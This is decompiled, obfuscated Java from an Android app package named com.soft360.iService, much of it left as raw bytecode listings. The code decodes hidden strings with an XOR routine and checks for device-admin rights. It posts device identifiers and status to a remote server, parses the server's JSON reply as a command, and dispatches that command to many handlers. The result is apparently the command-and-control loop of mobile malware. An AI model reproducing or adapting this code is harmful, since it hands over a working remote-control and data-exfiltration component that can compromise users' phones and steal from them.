import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.database.SQLException;
import android.media.RingtoneManager;
import android.os.Build;
import android.os.Environment;
import android.telephony.TelephonyManager;
import com.soft360.iService.AService;
import com.soft360.iService.MainActivity;
import com.soft360.iService.webService;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.net.ConnectException;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.JSONTokener;

public final class eu
{
  public static en a;
  private static eu jdField_a_of_type_Eu = null;
  private static String jdField_a_of_type_JavaLangString;
  int jdField_a_of_type_Int = 10;
  Context jdField_a_of_type_AndroidContentContext;
  private int b = 2;
  
  public static eu a(String paramString)
  {
    if (jdField_a_of_type_Eu == null)
    {
      jdField_a_of_type_Eu = new eu();
      jdField_a_of_type_JavaLangString = paramString;
    }
    return jdField_a_of_type_Eu;
  }
  
  private static String a(Context paramContext, int paramInt)
  {
    paramContext = cD.b(paramContext.getString(paramInt));
    long l = 12399L;
    StringBuffer localStringBuffer = new StringBuffer("");
    paramInt = 0;
    for (;;)
    {
      if (paramInt >= paramContext.length()) {
        return localStringBuffer.toString();
      }
      int i = (short)paramContext.charAt(paramInt);
      localStringBuffer.append((char)(int)(i ^ l >> 8));
      l = ((l + i) * 52845L + 22719L) % 65536L;
      paramInt += 1;
    }
  }
  
  private static String a(String paramString)
  {
    String str;
    if ((paramString == null) || (paramString.length() == 0)) {
      str = "";
    }
    char c;
    do
    {
      return str;
      c = paramString.charAt(0);
      str = paramString;
    } while (Character.isUpperCase(c));
    return Character.toUpperCase(c) + paramString.substring(1);
  }
  
  private void a(int paramInt, String paramString1, String paramString2)
  {
    Notification localNotification = new Notification(paramInt, this.jdField_a_of_type_AndroidContentContext.getString(2131165184), System.currentTimeMillis());
    localNotification.flags = 16;
    localNotification.sound = RingtoneManager.getDefaultUri(2);
    Object localObject = new Intent(this.jdField_a_of_type_AndroidContentContext, MainActivity.class);
    ((Intent)localObject).putExtra("greedConfirm", true);
    ((Intent)localObject).setAction("android.intent.action.MAIN");
    ((Intent)localObject).addCategory("android.intent.category.LAUNCHER");
    localObject = PendingIntent.getActivity(this.jdField_a_of_type_AndroidContentContext, 0, (Intent)localObject, 0);
    localNotification.setLatestEventInfo(this.jdField_a_of_type_AndroidContentContext, paramString1, paramString2, (PendingIntent)localObject);
    ((NotificationManager)this.jdField_a_of_type_AndroidContentContext.getSystemService("notification")).notify(558, localNotification);
  }
  
  /* Error */
  private void a(dU paramdU, int paramInt1, int paramInt2, int paramInt3, int paramInt4)
  {
    // Byte code:
    //   0: new 186	org/apache/http/impl/client/DefaultHttpClient
    //   3: dup
    //   4: invokespecial 187	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   7: astore 10
    //   9: aload 10
    //   11: invokeinterface 193 1 0
    //   16: ldc -61
    //   18: ldc -59
    //   20: invokeinterface 203 3 0
    //   25: pop
    //   26: aload_0
    //   27: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   30: ldc -52
    //   32: invokevirtual 34	android/content/Context:getString	(I)Ljava/lang/String;
    //   35: astore 8
    //   37: aload_1
    //   38: getfield 209	dU:a	LcD;
    //   41: astore 9
    //   43: new 50	java/lang/String
    //   46: dup
    //   47: aload 8
    //   49: invokestatic 211	cD:a	(Ljava/lang/String;)Ljava/lang/String;
    //   52: invokespecial 212	java/lang/String:<init>	(Ljava/lang/String;)V
    //   55: astore 9
    //   57: aload 9
    //   59: astore 8
    //   61: new 83	java/lang/StringBuilder
    //   64: dup
    //   65: aload_1
    //   66: getstatic 215	com/soft360/iService/AService:jdField_a_of_type_Int	I
    //   69: invokevirtual 217	dU:a	(I)Ljava/lang/String;
    //   72: invokestatic 220	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   75: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   78: aload 8
    //   80: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   83: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   86: astore 8
    //   88: new 222	org/apache/http/client/methods/HttpPost
    //   91: dup
    //   92: aload 8
    //   94: invokespecial 223	org/apache/http/client/methods/HttpPost:<init>	(Ljava/lang/String;)V
    //   97: astore 9
    //   99: aload_0
    //   100: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   103: ldc -31
    //   105: invokevirtual 167	android/content/Context:getSystemService	(Ljava/lang/String;)Ljava/lang/Object;
    //   108: checkcast 227	android/app/admin/DevicePolicyManager
    //   111: new 229	android/content/ComponentName
    //   114: dup
    //   115: aload_0
    //   116: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   119: ldc -25
    //   121: invokespecial 232	android/content/ComponentName:<init>	(Landroid/content/Context;Ljava/lang/Class;)V
    //   124: invokevirtual 236	android/app/admin/DevicePolicyManager:isAdminActive	(Landroid/content/ComponentName;)Z
    //   127: ifeq +1208 -> 1335
    //   130: iconst_1
    //   131: istore 6
    //   133: new 238	java/util/ArrayList
    //   136: dup
    //   137: invokespecial 239	java/util/ArrayList:<init>	()V
    //   140: astore 11
    //   142: aload_0
    //   143: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   146: ldc -16
    //   148: invokevirtual 34	android/content/Context:getString	(I)Ljava/lang/String;
    //   151: ldc -14
    //   153: invokevirtual 246	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   156: ifne +406 -> 562
    //   159: aload 11
    //   161: new 248	org/apache/http/message/BasicNameValuePair
    //   164: dup
    //   165: ldc -6
    //   167: aload_1
    //   168: invokevirtual 252	dU:b	()Ljava/lang/String;
    //   171: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   174: invokeinterface 260 2 0
    //   179: pop
    //   180: aload 11
    //   182: new 248	org/apache/http/message/BasicNameValuePair
    //   185: dup
    //   186: ldc_w 262
    //   189: aload_0
    //   190: invokevirtual 264	eu:a	()Ljava/lang/String;
    //   193: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   196: invokeinterface 260 2 0
    //   201: pop
    //   202: aload 11
    //   204: new 248	org/apache/http/message/BasicNameValuePair
    //   207: dup
    //   208: ldc_w 266
    //   211: new 83	java/lang/StringBuilder
    //   214: dup
    //   215: iload_2
    //   216: invokestatic 268	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   219: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   222: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   225: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   228: invokeinterface 260 2 0
    //   233: pop
    //   234: aload 11
    //   236: new 248	org/apache/http/message/BasicNameValuePair
    //   239: dup
    //   240: ldc_w 270
    //   243: new 83	java/lang/StringBuilder
    //   246: dup
    //   247: iload_3
    //   248: invokestatic 268	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   251: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   254: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   257: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   260: invokeinterface 260 2 0
    //   265: pop
    //   266: aload 11
    //   268: new 248	org/apache/http/message/BasicNameValuePair
    //   271: dup
    //   272: ldc_w 272
    //   275: new 83	java/lang/StringBuilder
    //   278: dup
    //   279: iload 4
    //   281: invokestatic 268	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   284: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   287: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   290: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   293: invokeinterface 260 2 0
    //   298: pop
    //   299: aload 11
    //   301: new 248	org/apache/http/message/BasicNameValuePair
    //   304: dup
    //   305: ldc_w 274
    //   308: new 83	java/lang/StringBuilder
    //   311: dup
    //   312: iload 5
    //   314: invokestatic 268	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   317: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   320: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   323: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   326: invokeinterface 260 2 0
    //   331: pop
    //   332: aload 11
    //   334: new 248	org/apache/http/message/BasicNameValuePair
    //   337: dup
    //   338: ldc_w 276
    //   341: new 83	java/lang/StringBuilder
    //   344: dup
    //   345: iload 6
    //   347: invokestatic 268	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   350: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   353: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   356: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   359: invokeinterface 260 2 0
    //   364: pop
    //   365: aload 11
    //   367: new 248	org/apache/http/message/BasicNameValuePair
    //   370: dup
    //   371: ldc_w 278
    //   374: aload_0
    //   375: invokespecial 281	eu:f	()Ljava/lang/String;
    //   378: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   381: invokeinterface 260 2 0
    //   386: pop
    //   387: aload 11
    //   389: new 248	org/apache/http/message/BasicNameValuePair
    //   392: dup
    //   393: ldc_w 283
    //   396: getstatic 286	em:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   399: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   402: invokeinterface 260 2 0
    //   407: pop
    //   408: aload 9
    //   410: new 288	org/apache/http/client/entity/UrlEncodedFormEntity
    //   413: dup
    //   414: aload 11
    //   416: ldc -59
    //   418: invokespecial 291	org/apache/http/client/entity/UrlEncodedFormEntity:<init>	(Ljava/util/List;Ljava/lang/String;)V
    //   421: invokevirtual 295	org/apache/http/client/methods/HttpPost:setEntity	(Lorg/apache/http/HttpEntity;)V
    //   424: new 297	java/io/BufferedReader
    //   427: dup
    //   428: new 299	java/io/InputStreamReader
    //   431: dup
    //   432: aload 10
    //   434: aload 9
    //   436: invokeinterface 303 2 0
    //   441: invokeinterface 309 1 0
    //   446: invokeinterface 315 1 0
    //   451: ldc -59
    //   453: invokespecial 318	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;Ljava/lang/String;)V
    //   456: invokespecial 321	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   459: astore 9
    //   461: new 83	java/lang/StringBuilder
    //   464: dup
    //   465: invokespecial 322	java/lang/StringBuilder:<init>	()V
    //   468: astore 10
    //   470: aload 9
    //   472: invokevirtual 325	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   475: astore 11
    //   477: aload 11
    //   479: ifnonnull +324 -> 803
    //   482: new 327	org/json/JSONObject
    //   485: dup
    //   486: new 329	org/json/JSONTokener
    //   489: dup
    //   490: aload 10
    //   492: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   495: invokespecial 330	org/json/JSONTokener:<init>	(Ljava/lang/String;)V
    //   498: invokespecial 333	org/json/JSONObject:<init>	(Lorg/json/JSONTokener;)V
    //   501: ldc_w 335
    //   504: invokevirtual 337	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   507: astore 9
    //   509: new 83	java/lang/StringBuilder
    //   512: dup
    //   513: aload 8
    //   515: invokestatic 220	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   518: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   521: ldc_w 339
    //   524: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   527: aload 9
    //   529: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   532: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   535: pop
    //   536: invokestatic 342	em:a	()Lem;
    //   539: astore 8
    //   541: aload 8
    //   543: aload 9
    //   545: invokevirtual 344	em:a	(Ljava/lang/String;)V
    //   548: aload 8
    //   550: invokevirtual 348	em:c	()Z
    //   553: ifeq +267 -> 820
    //   556: aload_1
    //   557: invokevirtual 351	dU:e	()Z
    //   560: pop
    //   561: return
    //   562: aload 11
    //   564: new 248	org/apache/http/message/BasicNameValuePair
    //   567: dup
    //   568: ldc -6
    //   570: aload_1
    //   571: invokevirtual 252	dU:b	()Ljava/lang/String;
    //   574: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   577: invokeinterface 260 2 0
    //   582: pop
    //   583: aload 11
    //   585: new 248	org/apache/http/message/BasicNameValuePair
    //   588: dup
    //   589: ldc_w 262
    //   592: aload_0
    //   593: invokevirtual 264	eu:a	()Ljava/lang/String;
    //   596: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   599: invokeinterface 260 2 0
    //   604: pop
    //   605: aload 11
    //   607: new 248	org/apache/http/message/BasicNameValuePair
    //   610: dup
    //   611: ldc_w 266
    //   614: new 83	java/lang/StringBuilder
    //   617: dup
    //   618: iload_2
    //   619: invokestatic 268	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   622: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   625: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   628: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   631: invokeinterface 260 2 0
    //   636: pop
    //   637: aload 11
    //   639: new 248	org/apache/http/message/BasicNameValuePair
    //   642: dup
    //   643: ldc_w 270
    //   646: new 83	java/lang/StringBuilder
    //   649: dup
    //   650: iload_3
    //   651: invokestatic 268	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   654: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   657: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   660: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   663: invokeinterface 260 2 0
    //   668: pop
    //   669: aload 11
    //   671: new 248	org/apache/http/message/BasicNameValuePair
    //   674: dup
    //   675: ldc_w 272
    //   678: new 83	java/lang/StringBuilder
    //   681: dup
    //   682: iload 4
    //   684: invokestatic 268	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   687: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   690: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   693: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   696: invokeinterface 260 2 0
    //   701: pop
    //   702: aload 11
    //   704: new 248	org/apache/http/message/BasicNameValuePair
    //   707: dup
    //   708: ldc_w 276
    //   711: new 83	java/lang/StringBuilder
    //   714: dup
    //   715: iload 6
    //   717: invokestatic 268	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   720: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   723: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   726: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   729: invokeinterface 260 2 0
    //   734: pop
    //   735: aload 11
    //   737: new 248	org/apache/http/message/BasicNameValuePair
    //   740: dup
    //   741: ldc_w 278
    //   744: aload_0
    //   745: invokespecial 281	eu:f	()Ljava/lang/String;
    //   748: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   751: invokeinterface 260 2 0
    //   756: pop
    //   757: aload 11
    //   759: new 248	org/apache/http/message/BasicNameValuePair
    //   762: dup
    //   763: ldc_w 283
    //   766: getstatic 286	em:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   769: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   772: invokeinterface 260 2 0
    //   777: pop
    //   778: aload 11
    //   780: new 248	org/apache/http/message/BasicNameValuePair
    //   783: dup
    //   784: ldc_w 353
    //   787: aload_1
    //   788: getfield 356	dU:i	Ljava/lang/String;
    //   791: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   794: invokeinterface 260 2 0
    //   799: pop
    //   800: goto -392 -> 408
    //   803: aload 10
    //   805: aload 11
    //   807: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   810: ldc_w 358
    //   813: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   816: pop
    //   817: goto -347 -> 470
    //   820: aload 8
    //   822: invokevirtual 360	em:f	()Z
    //   825: ifeq +14 -> 839
    //   828: invokestatic 361	dU:f	()Z
    //   831: pop
    //   832: return
    //   833: astore_1
    //   834: aload_1
    //   835: invokevirtual 364	org/json/JSONException:printStackTrace	()V
    //   838: return
    //   839: aload 8
    //   841: invokevirtual 367	em:d	()Z
    //   844: istore 7
    //   846: iload 7
    //   848: ifeq +20 -> 868
    //   851: invokestatic 370	dU:g	()Z
    //   854: pop
    //   855: return
    //   856: astore_1
    //   857: aload_1
    //   858: invokevirtual 371	android/database/SQLException:printStackTrace	()V
    //   861: return
    //   862: astore_1
    //   863: aload_1
    //   864: invokevirtual 372	java/lang/Exception:printStackTrace	()V
    //   867: return
    //   868: aload 8
    //   870: invokevirtual 373	em:e	()Z
    //   873: istore 7
    //   875: iload 7
    //   877: ifeq +20 -> 897
    //   880: invokestatic 376	dU:h	()Z
    //   883: pop
    //   884: return
    //   885: astore_1
    //   886: aload_1
    //   887: invokevirtual 371	android/database/SQLException:printStackTrace	()V
    //   890: return
    //   891: astore_1
    //   892: aload_1
    //   893: invokevirtual 372	java/lang/Exception:printStackTrace	()V
    //   896: return
    //   897: aload 8
    //   899: invokevirtual 377	em:g	()Z
    //   902: ifeq +8 -> 910
    //   905: aload_1
    //   906: invokevirtual 379	dU:b	()V
    //   909: return
    //   910: aload 8
    //   912: invokevirtual 380	em:h	()Z
    //   915: ifeq +8 -> 923
    //   918: aload_1
    //   919: invokevirtual 382	dU:c	()V
    //   922: return
    //   923: aload 8
    //   925: invokevirtual 385	em:j	()Z
    //   928: ifeq +47 -> 975
    //   931: getstatic 387	eu:jdField_a_of_type_En	Len;
    //   934: ifnull +14 -> 948
    //   937: getstatic 387	eu:jdField_a_of_type_En	Len;
    //   940: invokevirtual 390	en:b	()V
    //   943: aconst_null
    //   944: putstatic 387	eu:jdField_a_of_type_En	Len;
    //   947: return
    //   948: new 389	en
    //   951: dup
    //   952: invokespecial 391	en:<init>	()V
    //   955: astore_1
    //   956: aload_1
    //   957: putstatic 387	eu:jdField_a_of_type_En	Len;
    //   960: aload_1
    //   961: invokevirtual 393	en:a	()V
    //   964: getstatic 387	eu:jdField_a_of_type_En	Len;
    //   967: invokevirtual 394	en:c	()V
    //   970: invokestatic 396	dU:a	()Z
    //   973: pop
    //   974: return
    //   975: aload 8
    //   977: invokevirtual 399	em:k	()Z
    //   980: ifeq +24 -> 1004
    //   983: invokestatic 401	dU:b	()Z
    //   986: pop
    //   987: getstatic 387	eu:jdField_a_of_type_En	Len;
    //   990: ifnull +339 -> 1329
    //   993: getstatic 387	eu:jdField_a_of_type_En	Len;
    //   996: invokevirtual 390	en:b	()V
    //   999: aconst_null
    //   1000: putstatic 387	eu:jdField_a_of_type_En	Len;
    //   1003: return
    //   1004: aload 8
    //   1006: invokevirtual 404	em:n	()Z
    //   1009: ifeq +9 -> 1018
    //   1012: aload 9
    //   1014: invokestatic 405	dU:a	(Ljava/lang/String;)V
    //   1017: return
    //   1018: aload 8
    //   1020: invokevirtual 407	em:i	()Z
    //   1023: ifeq +8 -> 1031
    //   1026: aload_1
    //   1027: invokevirtual 409	dU:d	()V
    //   1030: return
    //   1031: aload 8
    //   1033: invokevirtual 412	em:o	()Z
    //   1036: ifeq +7 -> 1043
    //   1039: invokestatic 414	dU:e	()V
    //   1042: return
    //   1043: aload 8
    //   1045: invokevirtual 415	em:b	()Z
    //   1048: ifeq +23 -> 1071
    //   1051: aload_1
    //   1052: aload 9
    //   1054: aload 9
    //   1056: ldc_w 417
    //   1059: invokevirtual 421	java/lang/String:lastIndexOf	(Ljava/lang/String;)I
    //   1062: iconst_1
    //   1063: iadd
    //   1064: invokevirtual 95	java/lang/String:substring	(I)Ljava/lang/String;
    //   1067: invokevirtual 423	dU:b	(Ljava/lang/String;)V
    //   1070: return
    //   1071: aload 8
    //   1073: invokevirtual 426	em:p	()Z
    //   1076: ifeq +8 -> 1084
    //   1079: aload_1
    //   1080: invokevirtual 428	dU:f	()V
    //   1083: return
    //   1084: aload 8
    //   1086: invokevirtual 431	em:r	()Z
    //   1089: ifeq +8 -> 1097
    //   1092: aload_1
    //   1093: invokevirtual 433	dU:g	()V
    //   1096: return
    //   1097: aload 8
    //   1099: invokevirtual 436	em:s	()Z
    //   1102: ifeq +8 -> 1110
    //   1105: aload_1
    //   1106: invokevirtual 438	dU:h	()V
    //   1109: return
    //   1110: aload 8
    //   1112: invokevirtual 441	em:l	()Z
    //   1115: ifeq +8 -> 1123
    //   1118: invokestatic 442	dU:c	()Z
    //   1121: pop
    //   1122: return
    //   1123: aload 8
    //   1125: invokevirtual 445	em:m	()Z
    //   1128: ifeq +8 -> 1136
    //   1131: invokestatic 446	dU:d	()Z
    //   1134: pop
    //   1135: return
    //   1136: aload 8
    //   1138: invokevirtual 449	em:t	()Z
    //   1141: ifeq +188 -> 1329
    //   1144: aload 9
    //   1146: ldc_w 417
    //   1149: invokevirtual 453	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   1152: astore_1
    //   1153: aload_0
    //   1154: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   1157: invokestatic 459	android/preference/PreferenceManager:getDefaultSharedPreferences	(Landroid/content/Context;)Landroid/content/SharedPreferences;
    //   1160: invokeinterface 465 1 0
    //   1165: astore 8
    //   1167: aload 8
    //   1169: ldc_w 467
    //   1172: aload_1
    //   1173: iconst_1
    //   1174: aaload
    //   1175: invokeinterface 473 3 0
    //   1180: pop
    //   1181: aload 8
    //   1183: invokeinterface 476 1 0
    //   1188: pop
    //   1189: aload_0
    //   1190: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   1193: ldc -16
    //   1195: invokevirtual 34	android/content/Context:getString	(I)Ljava/lang/String;
    //   1198: invokestatic 481	java/lang/Integer:parseInt	(Ljava/lang/String;)I
    //   1201: istore_2
    //   1202: aload_0
    //   1203: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   1206: ldc_w 482
    //   1209: invokevirtual 34	android/content/Context:getString	(I)Ljava/lang/String;
    //   1212: astore_1
    //   1213: aload_1
    //   1214: aload_1
    //   1215: ldc_w 484
    //   1218: invokevirtual 421	java/lang/String:lastIndexOf	(Ljava/lang/String;)I
    //   1221: iconst_1
    //   1222: iadd
    //   1223: aload_1
    //   1224: ldc_w 486
    //   1227: invokevirtual 421	java/lang/String:lastIndexOf	(Ljava/lang/String;)I
    //   1230: invokevirtual 489	java/lang/String:substring	(II)Ljava/lang/String;
    //   1233: astore_1
    //   1234: aload_0
    //   1235: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   1238: invokevirtual 493	android/content/Context:getResources	()Landroid/content/res/Resources;
    //   1241: aload_1
    //   1242: ldc_w 495
    //   1245: aload_0
    //   1246: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   1249: invokevirtual 498	android/content/Context:getPackageName	()Ljava/lang/String;
    //   1252: invokevirtual 504	android/content/res/Resources:getIdentifier	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I
    //   1255: istore_3
    //   1256: iload_2
    //   1257: tableswitch	default:+88->1345, 27:+23->1280, 28:+48->1305
    //   1280: aload_0
    //   1281: iload_3
    //   1282: aload_0
    //   1283: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   1286: ldc 105
    //   1288: invokevirtual 34	android/content/Context:getString	(I)Ljava/lang/String;
    //   1291: aload_0
    //   1292: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   1295: ldc_w 505
    //   1298: invokestatic 507	eu:a	(Landroid/content/Context;I)Ljava/lang/String;
    //   1301: invokespecial 509	eu:a	(ILjava/lang/String;Ljava/lang/String;)V
    //   1304: return
    //   1305: aload_0
    //   1306: iload_3
    //   1307: aload_0
    //   1308: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   1311: ldc 105
    //   1313: invokevirtual 34	android/content/Context:getString	(I)Ljava/lang/String;
    //   1316: aload_0
    //   1317: getfield 104	eu:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   1320: ldc_w 510
    //   1323: invokestatic 507	eu:a	(Landroid/content/Context;I)Ljava/lang/String;
    //   1326: invokespecial 509	eu:a	(ILjava/lang/String;Ljava/lang/String;)V
    //   1329: return
    //   1330: astore 9
    //   1332: goto -1271 -> 61
    //   1335: iconst_0
    //   1336: istore 6
    //   1338: goto -1205 -> 133
    //   1341: astore_1
    //   1342: return
    //   1343: astore_1
    //   1344: return
    //   1345: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	1346	0	this	eu
    //   0	1346	1	paramdU	dU
    //   0	1346	2	paramInt1	int
    //   0	1346	3	paramInt2	int
    //   0	1346	4	paramInt3	int
    //   0	1346	5	paramInt4	int
    //   131	1206	6	i	int
    //   844	32	7	bool	boolean
    //   35	1147	8	localObject1	Object
    //   41	1104	9	localObject2	Object
    //   1330	1	9	localException	Exception
    //   7	797	10	localObject3	Object
    //   140	666	11	localObject4	Object
    // Exception table:
    //   from	to	target	type
    //   133	408	833	org/json/JSONException
    //   408	470	833	org/json/JSONException
    //   470	477	833	org/json/JSONException
    //   482	561	833	org/json/JSONException
    //   562	800	833	org/json/JSONException
    //   803	817	833	org/json/JSONException
    //   820	832	833	org/json/JSONException
    //   839	846	833	org/json/JSONException
    //   851	855	833	org/json/JSONException
    //   857	861	833	org/json/JSONException
    //   863	867	833	org/json/JSONException
    //   868	875	833	org/json/JSONException
    //   880	884	833	org/json/JSONException
    //   886	890	833	org/json/JSONException
    //   892	896	833	org/json/JSONException
    //   897	909	833	org/json/JSONException
    //   910	922	833	org/json/JSONException
    //   923	947	833	org/json/JSONException
    //   948	974	833	org/json/JSONException
    //   975	1003	833	org/json/JSONException
    //   1004	1017	833	org/json/JSONException
    //   1018	1030	833	org/json/JSONException
    //   1031	1042	833	org/json/JSONException
    //   1043	1070	833	org/json/JSONException
    //   1071	1083	833	org/json/JSONException
    //   1084	1096	833	org/json/JSONException
    //   1097	1109	833	org/json/JSONException
    //   1110	1122	833	org/json/JSONException
    //   1123	1135	833	org/json/JSONException
    //   1136	1256	833	org/json/JSONException
    //   1280	1304	833	org/json/JSONException
    //   1305	1329	833	org/json/JSONException
    //   851	855	856	android/database/SQLException
    //   851	855	862	java/lang/Exception
    //   880	884	885	android/database/SQLException
    //   880	884	891	java/lang/Exception
    //   37	57	1330	java/lang/Exception
    //   133	408	1341	org/apache/http/client/ClientProtocolException
    //   408	470	1341	org/apache/http/client/ClientProtocolException
    //   470	477	1341	org/apache/http/client/ClientProtocolException
    //   482	561	1341	org/apache/http/client/ClientProtocolException
    //   562	800	1341	org/apache/http/client/ClientProtocolException
    //   803	817	1341	org/apache/http/client/ClientProtocolException
    //   820	832	1341	org/apache/http/client/ClientProtocolException
    //   839	846	1341	org/apache/http/client/ClientProtocolException
    //   851	855	1341	org/apache/http/client/ClientProtocolException
    //   857	861	1341	org/apache/http/client/ClientProtocolException
    //   863	867	1341	org/apache/http/client/ClientProtocolException
    //   868	875	1341	org/apache/http/client/ClientProtocolException
    //   880	884	1341	org/apache/http/client/ClientProtocolException
    //   886	890	1341	org/apache/http/client/ClientProtocolException
    //   892	896	1341	org/apache/http/client/ClientProtocolException
    //   897	909	1341	org/apache/http/client/ClientProtocolException
    //   910	922	1341	org/apache/http/client/ClientProtocolException
    //   923	947	1341	org/apache/http/client/ClientProtocolException
    //   948	974	1341	org/apache/http/client/ClientProtocolException
    //   975	1003	1341	org/apache/http/client/ClientProtocolException
    //   1004	1017	1341	org/apache/http/client/ClientProtocolException
    //   1018	1030	1341	org/apache/http/client/ClientProtocolException
    //   1031	1042	1341	org/apache/http/client/ClientProtocolException
    //   1043	1070	1341	org/apache/http/client/ClientProtocolException
    //   1071	1083	1341	org/apache/http/client/ClientProtocolException
    //   1084	1096	1341	org/apache/http/client/ClientProtocolException
    //   1097	1109	1341	org/apache/http/client/ClientProtocolException
    //   1110	1122	1341	org/apache/http/client/ClientProtocolException
    //   1123	1135	1341	org/apache/http/client/ClientProtocolException
